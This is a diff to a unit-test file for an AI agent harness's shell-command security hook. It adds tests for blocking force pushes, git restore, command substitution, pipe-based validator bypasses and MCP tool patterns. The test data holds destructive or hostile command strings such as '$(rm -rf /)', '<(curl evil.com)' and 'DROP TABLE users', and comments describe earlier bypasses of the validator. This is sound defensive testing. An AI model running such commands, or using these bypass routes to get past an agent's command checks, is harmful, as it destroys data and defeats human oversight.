@@ -13,9 +13,15 @@ from claude_agent_sdk import HookInput
 
 from agent_harness.config import BashSecurityConfig, ExtraValidatorConfig
 from agent_harness.security import (
+    _check_command_substitution,
     create_bash_security_hook,
+    create_mcp_tool_hook,
     extract_commands,
+    get_command_segment_pairs,
+    split_command_segments,
+    strip_balanced_parens,
     validate_chmod_command,
+    validate_git_command,
     validate_init_script,
     validate_pkill_command,
 )
@@ -54,7 +60,7 @@ class TestSecurity(unittest.TestCase):
         input_data = cast(
             HookInput, {"tool_name": "Bash", "tool_input": {"command": command}}
         )
-        result = asyncio.run(self.hook(input_data))
+        result = asyncio.run(self.hook(input_data, None, None))
         actual_decision = result.get("decision", "allow")
         self.assertEqual(
             actual_decision,
@@ -102,13 +108,32 @@ class TestSecurity(unittest.TestCase):
                 allowed, _ = validate_chmod_command(cmd, ["+x", "u+x", "a+x"])
                 self.assertEqual(allowed, should_allow)
 
+    def test_validate_chmod_custom_modes(self) -> None:
+        """Test chmod validation respects custom allowed_modes."""
+        # Allow numeric mode 644
+        allowed, _ = validate_chmod_command("chmod 644 file.txt", ["644", "755"])
+        self.assertTrue(allowed)
+        allowed, _ = validate_chmod_command("chmod 755 file.txt", ["644", "755"])
+        self.assertTrue(allowed)
+        allowed, _ = validate_chmod_command("chmod 777 file.txt", ["644", "755"])
+        self.assertFalse(allowed)
+
+        # Allow +r but not +x
+        allowed, _ = validate_chmod_command("chmod +r file.txt", ["+r"])
+        self.assertTrue(allowed)
+        allowed, _ = validate_chmod_command("chmod +x file.txt", ["+r"])
+        self.assertFalse(allowed)
+        # +r with prefix should still work
+        allowed, _ = validate_chmod_command("chmod u+r file.txt", ["+r"])
+        self.assertTrue(allowed)
+
     def test_validate_init_script(self) -> None:
         """Test init.sh script execution validation."""
         test_cases = [
             ("./init.sh", True, "basic ./init.sh"),
             ("./init.sh arg1 arg2", True, "with arguments"),
-            ("/path/to/init.sh", True, "absolute path"),
-            ("../dir/init.sh", True, "relative path with init.sh"),
+            ("/path/to/init.sh", False, "absolute path"),
+            ("../dir/init.sh", False, "relative path with init.sh"),
             ("./setup.sh", False, "different script name"),
             ("./init.py", False, "python script"),
             ("bash init.sh", False, "bash invocation"),
@@ -161,9 +186,18 @@ class TestSecurity(unittest.TestCase):
             "git reset --hard origin/main",
             "git checkout -- .",
             "git checkout -- file.txt",
+            "git restore file.txt",
+            "git restore .",
             "git push --force",
             "git push -f",
             "git push origin main --force",
+            "git push --force-with-lease",
+            "git push --force-if-includes",
+            "git push --force-with-lease=origin/main",
+            "git checkout -f",
+            "git checkout --force",
+            "git checkout -f main",
+            "/path/to/init.sh",
         ]
 
         for cmd in dangerous:
@@ -208,7 +242,6 @@ class TestSecurity(unittest.TestCase):
             "pkill node",
             "pkill npm",
             "pkill -f node",
-            "pkill -f 'node server.js'",
             "pkill vite",
             "npm install && npm run build",
             "ls | grep test",
@@ -222,7 +255,6 @@ class TestSecurity(unittest.TestCase):
             "chmod a+x init.sh",
             "./init.sh",
             "./init.sh --production",
-            "/path/to/init.sh",
             "chmod +x init.sh && ./init.sh",
             "( npm install ) && ( npm run build )",
             "(ls /tmp && cat file.txt)",
@@ -240,7 +272,7 @@ class TestSecurity(unittest.TestCase):
         input_data = cast(
             HookInput, {"tool_name": "Bash", "tool_input": {"command": "ls"}}
         )
-        result = asyncio.run(hook(input_data))
+        result = asyncio.run(hook(input_data, None, None))
         self.assertEqual(result.get("decision"), "block")
 
     def test_custom_allowlist(self) -> None:
@@ -255,15 +287,31 @@ class TestSecurity(unittest.TestCase):
         input_data = cast(
             HookInput, {"tool_name": "Bash", "tool_input": {"command": "python app.py"}}
         )
-        result = asyncio.run(hook(input_data))
+        result = asyncio.run(hook(input_data, None, None))
         self.assertEqual(result.get("decision", "allow"), "allow")
 
         # npm should be blocked
         input_data = cast(
             HookInput, {"tool_name": "Bash", "tool_input": {"command": "npm install"}}
         )
-        result = asyncio.run(hook(input_data))
+        result = asyncio.run(hook(input_data, None, None))
         self.assertEqual(result.get("decision"), "block")
+
+    def test_unparseable_command_blocked(self) -> None:
+        """Commands with unmatched quotes should be blocked, not allowed."""
+        unparseable_cmds = [
+            "echo 'unmatched quote",
+            'cat "missing end',
+            "ls 'half",
+        ]
+        for cmd in unparseable_cmds:
+            with self.subTest(cmd=cmd):
+                self._assert_hook(cmd, "block")
+
+    def test_extract_commands_unparseable_returns_sentinel(self) -> None:
+        """extract_commands should return a sentinel for unparseable input."""
+        result = extract_commands("echo 'unmatched")
+        self.assertEqual(result, ["__UNPARSEABLE__"])
 
     def test_validate_pkill_with_custom_targets(self) -> None:
         """pkill validation should use configured targets."""
@@ -272,10 +320,27 @@ class TestSecurity(unittest.TestCase):
         allowed, _ = validate_pkill_command("pkill node", ["python", "java"])
         self.assertFalse(allowed)
 
+    def test_validate_pkill_shlex_split_output(self) -> None:
+        """pkill validation with shlex.split output - exact match only."""
+        # After removing dead code, we do exact matching on the target
+        # No special handling for space-separated patterns
+        test_cases = [
+            ("pkill node", ["node"], True),
+            ("pkill -f node", ["node"], True),
+            ("pkill -9 node", ["node"], True),
+            # Quoted strings with spaces require exact match (no first-word extraction)
+            ("pkill -f 'node server.js'", ["node server.js"], True),
+            ("pkill -f 'node server.js'", ["node"], False),  # Not just first word
+            ("pkill python", ["node"], False),
+            ("pkill -9 python", ["node"], False),
+        ]
+        for cmd, allowed_targets, should_allow in test_cases:
+            with self.subTest(cmd=cmd):
+                allowed, _ = validate_pkill_command(cmd, allowed_targets)
+                self.assertEqual(allowed, should_allow)
+
     def test_validate_git_allowed(self) -> None:
         """Test git commands that should be allowed."""
-        from agent_harness.security import validate_git_command
-
         allowed_cmds = [
             "git status",
             "git add .",
@@ -300,8 +365,6 @@ class TestSecurity(unittest.TestCase):
 
     def test_validate_git_blocked(self) -> None:
         """Test git commands that should be blocked."""
-        from agent_harness.security import validate_git_command
-
         blocked_cmds = [
             ("git clean", "removes untracked files"),
             ("git clean -f", "removes untracked files"),
@@ -315,6 +378,9 @@ class TestSecurity(unittest.TestCase):
             ("git push -f", "overwrites remote history"),
             ("git push origin main --force", "overwrites remote history"),
             ("git push origin main -f", "overwrites remote history"),
+            ("git push --force-with-lease", "overwrites remote history"),
+            ("git push --force-if-includes", "overwrites remote history"),
+            ("git push --force-with-lease=origin/main", "overwrites remote history"),
         ]
 
         for cmd, reason_fragment in blocked_cmds:
@@ -325,8 +391,6 @@ class TestSecurity(unittest.TestCase):
 
     def test_strip_balanced_parens(self) -> None:
         """Test balanced parenthesis stripping."""
-        from agent_harness.security import strip_balanced_parens
-
         # Balanced parens should be stripped
         self.assertEqual(strip_balanced_parens("(ls)"), "ls")
         self.assertEqual(strip_balanced_parens("((ls))"), "ls")
@@ -342,10 +406,215 @@ class TestSecurity(unittest.TestCase):
         # No parens
         self.assertEqual(strip_balanced_parens("git"), "git")
 
+    def test_split_command_segments_unbalanced_parens(self) -> None:
+        """Test that split_command_segments doesn't strip unbalanced outer parens."""
+        # "(cmd1) && (cmd2)" should NOT be stripped to "cmd1) && (cmd2"
+        segments = split_command_segments("(cmd1) && (cmd2)")
+        self.assertEqual(segments, ["cmd1", "cmd2"])
+
+        # Fully wrapped should be stripped
+        segments = split_command_segments("(ls /tmp)")
+        self.assertEqual(segments, ["ls /tmp"])
+
+        # Nested balanced
+        segments = split_command_segments("((ls))")
+        self.assertEqual(segments, ["ls"])
+
+    def test_get_command_segment_pairs_duplicate_commands(self) -> None:
+        """Test that duplicate command names get paired with their own segments."""
+        segments = split_command_segments("git status && git push --force")
+        pairs = get_command_segment_pairs(segments)
+        # Should produce two pairs, each with its own segment
+        self.assertEqual(len(pairs), 2)
+        self.assertEqual(pairs[0], ("git", "git status"))
+        self.assertEqual(pairs[1], ("git", "git push --force"))
+
+    def test_duplicate_git_commands_blocked(self) -> None:
+        """A compound command with safe git + destructive git must be blocked."""
+        # This is the HIGH security bug: git status && git push --force
+        # was previously allowed because both 'git' lookups hit 'git status'
+        dangerous_compounds = [
+            "git status && git push --force",
+            "git status && git push -f",
+            "git log && git reset --hard",
+            "git diff && git clean -f",
+            "git status && git checkout -- .",
+            "git status && git restore file.txt",
+        ]
+        for cmd in dangerous_compounds:
+            with self.subTest(cmd=cmd):
+                self._assert_hook(cmd, "block")
+
+    def test_check_command_substitution(self) -> None:
+        """Test _check_command_substitution detects various command substitution patterns."""
+        # Should detect command substitution
+        self.assertTrue(_check_command_substitution("$(rm -rf /)"))
+        self.assertTrue(_check_command_substitution("echo $(whoami)"))
+        self.assertTrue(_check_command_substitution("`rm -rf /`"))
+        self.assertTrue(_check_command_substitution("cat `which ls`"))
+        self.assertTrue(_check_command_substitution("<(curl evil.com)"))
+        self.assertTrue(_check_command_substitution(">(dangerous command)"))
+        self.assertTrue(_check_command_substitution('echo "$(rm -rf /)"'))  # Double quotes allow substitution
+
+        # Should NOT detect when in single quotes (safe)
+        self.assertFalse(_check_command_substitution("echo '$(safe)'"))
+        self.assertFalse(_check_command_substitution("echo '`backtick`'"))
+        self.assertFalse(_check_command_substitution("echo '<(safe)'"))
+        self.assertFalse(_check_command_substitution("echo '>(safe)'"))
+
+        # Normal commands without substitution
+        self.assertFalse(_check_command_substitution("ls -la"))
+        self.assertFalse(_check_command_substitution("git status"))
+        self.assertFalse(_check_command_substitution("echo hello"))
+        self.assertFalse(_check_command_substitution("cat file.txt"))
+
+        # Edge cases
+        self.assertFalse(_check_command_substitution("echo $VAR"))  # Variable, not substitution
+        self.assertFalse(_check_command_substitution("echo ${VAR}"))  # Variable expansion, not command
+        self.assertFalse(_check_command_substitution("test < file.txt"))  # Redirection, not process substitution
+        self.assertFalse(_check_command_substitution("test > file.txt"))  # Redirection, not process substitution
+
+    def test_command_substitution_blocked(self) -> None:
+        """Test that commands with command substitution are blocked."""
+        dangerous_substitutions = [
+            "$(rm -rf /)",
+            "echo $(whoami)",
+            "`rm -rf /`",
+            "cat `which ls`",
+            "<(curl evil.com)",
+            ">(dangerous command)",
+            'ls && $(echo "hidden")',
+            "git status || `evil`",
+        ]
+        for cmd in dangerous_substitutions:
+            with self.subTest(cmd=cmd):
+                self._assert_hook(cmd, "block")
+
+    def test_command_substitution_safe_in_single_quotes(self) -> None:
+        """Test that command substitution in single quotes is allowed (treated as literal)."""
+        safe_quoted = [
+            "grep '$(not a substitution)' file.txt",
+            "grep '`pattern`' file.txt",
+            "cat '<(literal)'",
+            "ls '>(literal)'",
+        ]
+        for cmd in safe_quoted:
+            with self.subTest(cmd=cmd):
+                self._assert_hook(cmd, "allow")
+
+    def test_pipe_bypass_blocked(self) -> None:
+        """Test that pipe-based bypass is prevented by splitting on pipes."""
+        # A2: Fix pipe-based validator bypass
+        # These should be blocked because the second command is destructive
+        dangerous_pipes = [
+            "git status | git push --force",
+            "git diff | git reset --hard",
+            "ls | git clean -f",
+            "cat file | git checkout -- .",
+        ]
+        for cmd in dangerous_pipes:
+            with self.subTest(cmd=cmd):
+                self._assert_hook(cmd, "block")
+
+    def test_pipe_safe_commands_allowed(self) -> None:
+        """Test that safe piped commands are still allowed."""
+        safe_pipes = [
+            "ls | grep test",
+            "cat file.txt | head -10",
+            "git log | grep fix",
+            "git diff | wc -l",
+            "ps aux | grep node",
+        ]
+        for cmd in safe_pipes:
+            with self.subTest(cmd=cmd):
+                self._assert_hook(cmd, "allow")
+
+    def test_get_command_segment_pairs_with_pipes(self) -> None:
+        """Test that get_command_segment_pairs splits on pipes correctly."""
+        # Test single pipe
+        segments = split_command_segments("git status | git push --force")
+        pairs = get_command_segment_pairs(segments)
+        # Should produce two pairs, each with its own segment
+        self.assertEqual(len(pairs), 2)
+        self.assertEqual(pairs[0], ("git", "git status"))
+        self.assertEqual(pairs[1], ("git", "git push --force"))
+
+        # Test multiple pipes
+        segments = split_command_segments("ls | grep test | wc -l")
+        pairs = get_command_segment_pairs(segments)
+        self.assertEqual(len(pairs), 3)
+        self.assertEqual(pairs[0], ("ls", "ls"))
+        self.assertEqual(pairs[1], ("grep", "grep test"))
+        self.assertEqual(pairs[2], ("wc", "wc -l"))
+
+        # Test || should not be split (it's logical OR, not a pipe)
+        segments = split_command_segments("git status || git init")
+        pairs = get_command_segment_pairs(segments)
+        self.assertEqual(len(pairs), 2)
+        # Both commands from different segments (split by ||)
+        self.assertEqual(pairs[0][0], "git")
+        self.assertEqual(pairs[1][0], "git")
+
+    def test_git_push_force_with_lease_blocked(self) -> None:
+        """git push --force-with-lease should be blocked."""
+        allowed, reason = validate_git_command("git push --force-with-lease")
+        self.assertFalse(allowed)
+        self.assertIn("force push", reason.lower())
+
+    def test_git_push_force_if_includes_blocked(self) -> None:
+        """git push --force-if-includes should be blocked."""
+        allowed, reason = validate_git_command("git push --force-if-includes")
+        self.assertFalse(allowed)
+        self.assertIn("force push", reason.lower())
+
+    def test_git_push_force_with_lease_equals_blocked(self) -> None:
+        """git push --force-with-lease=origin/main should be blocked."""
+        allowed, reason = validate_git_command("git push --force-with-lease=origin/main")
+        self.assertFalse(allowed)
+        self.assertIn("force push", reason.lower())
+
+    def test_validate_git_restore_blocked(self) -> None:
+        """git restore should be blocked (modern equivalent of git checkout --)."""
+        blocked_cmds = [
+            "git restore file.txt",
+            "git restore .",
+            "git restore --staged file.txt",
+        ]
+        for cmd in blocked_cmds:
+            with self.subTest(cmd=cmd):
+                allowed, reason = validate_git_command(cmd)
+                self.assertFalse(allowed, f"{cmd} should be blocked")
+                self.assertIn("restore", reason.lower())
+
+    def test_validate_git_checkout_force_blocked(self) -> None:
+        """git checkout -f and --force should be blocked (discards uncommitted changes)."""
+        blocked_cmds = [
+            ("git checkout -f", "discards uncommitted changes"),
+            ("git checkout --force", "discards uncommitted changes"),
+            ("git checkout -f main", "discards uncommitted changes"),
+            ("git checkout --force main", "discards uncommitted changes"),
+        ]
+        for cmd, reason_fragment in blocked_cmds:
+            with self.subTest(cmd=cmd):
+                allowed, reason = validate_git_command(cmd)
+                self.assertFalse(allowed, f"{cmd} should be blocked")
+                self.assertIn(reason_fragment, reason.lower())
+
+    def test_validate_init_script_rejects_arbitrary_paths(self) -> None:
+        """validate_init_script should only accept ./init.sh, not arbitrary paths."""
+        # These should be rejected (tightened from the old behavior)
+        rejected = [
+            "/tmp/evil/init.sh",
+            "/path/to/init.sh",
+            "../dir/init.sh",
+        ]
+        for cmd in rejected:
+            with self.subTest(cmd=cmd):
+                allowed, _ = validate_init_script(cmd)
+                self.assertFalse(allowed, f"{cmd} should be rejected")
+
     def test_create_mcp_tool_hook(self) -> None:
         """Test MCP tool hook creation and validation."""
-        from agent_harness.security import create_mcp_tool_hook
-
         # Test blocked patterns
         hook = create_mcp_tool_hook("test_tool", {"blocked_patterns": [r"rm -rf", r"--force"]})
 
@@ -379,6 +648,116 @@ class TestSecurity(unittest.TestCase):
             "tool_input": {"action": "delete"}
         })))
         self.assertEqual(result.get("decision"), "block")
+
+
+class TestMcpToolHookExpanded(unittest.TestCase):
+    """Expanded tests for MCP tool hook."""
+
+    def test_blocked_pattern_matching(self) -> None:
+        """Blocked patterns should match anywhere in the input."""
+        hook = create_mcp_tool_hook("my_tool", {"blocked_patterns": [r"DROP\s+TABLE"]})
+        # Should block
+        result = asyncio.run(hook(cast(HookInput, {
+            "tool_name": "my_tool",
+            "tool_input": {"query": "SELECT 1; DROP TABLE users"}
+        })))
+        self.assertEqual(result.get("decision"), "block")
+        # Should allow
+        result = asyncio.run(hook(cast(HookInput, {
+            "tool_name": "my_tool",
+            "tool_input": {"query": "SELECT * FROM users"}
+        })))
+        self.assertEqual(result.get("decision", "allow"), "allow")
+
+    def test_allowed_args_restriction(self) -> None:
+        """Only whitelisted actions should be allowed."""
+        hook = create_mcp_tool_hook("my_tool", {"allowed_args": ["read", "list"]})
+        # Allowed
+        result = asyncio.run(hook(cast(HookInput, {
+            "tool_name": "my_tool",
+            "tool_input": {"action": "read"}
+        })))
+        self.assertEqual(result.get("decision", "allow"), "allow")
+        # Blocked
+        result = asyncio.run(hook(cast(HookInput, {
+            "tool_name": "my_tool",
+            "tool_input": {"action": "write"}
+        })))
+        self.assertEqual(result.get("decision"), "block")
+
+    def test_tool_name_mismatch_returns_empty(self) -> None:
+        """Hook should return empty dict for mismatched tool names."""
+        hook = create_mcp_tool_hook("my_tool", {"blocked_patterns": [r".*"]})
+        result = asyncio.run(hook(cast(HookInput, {
+            "tool_name": "other_tool",
+            "tool_input": {"command": "anything"}
+        })))
+        self.assertEqual(result, {})
+
+    def test_multiple_blocked_patterns(self) -> None:
+        """All blocked patterns should be checked."""
+        hook = create_mcp_tool_hook("my_tool", {
+            "blocked_patterns": [r"DELETE", r"UPDATE", r"INSERT"]
+        })
+        for keyword in ["DELETE", "UPDATE", "INSERT"]:
+            with self.subTest(keyword=keyword):
+                result = asyncio.run(hook(cast(HookInput, {
+                    "tool_name": "my_tool",
+                    "tool_input": {"query": f"{keyword} FROM users"}
+                })))
+                self.assertEqual(result.get("decision"), "block")
+
+    def test_case_insensitive_matching(self) -> None:
+        """Blocked patterns should match case-insensitively."""
+        hook = create_mcp_tool_hook("my_tool", {"blocked_patterns": [r"drop table"]})
+        result = asyncio.run(hook(cast(HookInput, {
+            "tool_name": "my_tool",
+            "tool_input": {"query": "DROP TABLE users"}
+        })))
+        self.assertEqual(result.get("decision"), "block")
+
+    def test_command_param_for_allowed_args(self) -> None:
+        """allowed_args should also check 'command' parameter."""
+        hook = create_mcp_tool_hook("my_tool", {"allowed_args": ["status"]})
+        # Using "command" param instead of "action"
+        result = asyncio.run(hook(cast(HookInput, {
+            "tool_name": "my_tool",
+            "tool_input": {"command": "status"}
+        })))
+        self.assertEqual(result.get("decision", "allow"), "allow")
+        result = asyncio.run(hook(cast(HookInput, {
+            "tool_name": "my_tool",
+            "tool_input": {"command": "delete"}
+        })))
+        self.assertEqual(result.get("decision"), "block")
+
+    def test_no_restrictions_allows_all(self) -> None:
+        """Hook with no restrictions should allow everything."""
+        hook = create_mcp_tool_hook("my_tool", {})
+        result = asyncio.run(hook(cast(HookInput, {
+            "tool_name": "my_tool",
+            "tool_input": {"command": "rm -rf /"}
+        })))
+        self.assertEqual(result.get("decision", "allow"), "allow")
+
+    def test_json_dumps_pattern_matching(self) -> None:
+        """MCP hook should use json.dumps for reliable pattern matching."""
+        # Test with nested objects and special characters that str() might handle differently
+        hook = create_mcp_tool_hook("my_tool", {"blocked_patterns": [r'"dangerous_key":\s*true']})
+
+        # Should block when pattern matches JSON structure
+        result = asyncio.run(hook(cast(HookInput, {
+            "tool_name": "my_tool",
+            "tool_input": {"dangerous_key": True, "other": "value"}
+        })))
+        self.assertEqual(result.get("decision"), "block")
+
+        # Should allow when pattern doesn't match
+        result = asyncio.run(hook(cast(HookInput, {
+            "tool_name": "my_tool",
+            "tool_input": {"safe_key": True, "other": "value"}
+        })))
+        self.assertEqual(result.get("decision", "allow"), "allow")
 
 
 if __name__ == "__main__":
